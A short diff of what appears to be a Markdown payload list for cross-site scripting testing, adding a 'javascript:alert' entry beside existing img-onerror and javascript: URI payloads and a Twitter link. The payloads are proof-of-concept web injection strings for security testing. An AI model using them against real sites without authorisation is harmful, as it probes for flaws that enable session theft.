@@ -27,5 +27,7 @@ if You Are New then You Can Read the basics here :-https://fanimalikhack.medium.
    2)<img src=x onerror=alert`1`>
    3)<img src=x onerror=prompt`1`>
    4)javascript:prompt`1`
+   5)javascript:alert`1`
 ```
 
+## Twitter:[@fanimalikhack](https://twitter.com/fanimalikhack/)
